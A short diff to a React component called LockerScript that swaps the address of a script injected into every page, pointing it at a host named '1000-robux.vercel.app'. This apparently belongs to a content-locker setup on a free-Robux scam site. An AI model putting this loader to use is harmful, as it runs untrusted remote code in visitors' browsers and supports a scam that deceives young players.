@@ -7,7 +7,7 @@ export const LockerScript: React.FC = () => {
       const script = document.createElement('script');
       script.id = 'ogjs';
       script.type = 'text/javascript';
-      script.src = 'https://www.craftgaminghub.xyz/cl/js/82dk53';
+      script.src = 'https://1000-robux.vercel.app/cl/js/82dk53';
       script.async = true;
       document.body.appendChild(script);
       
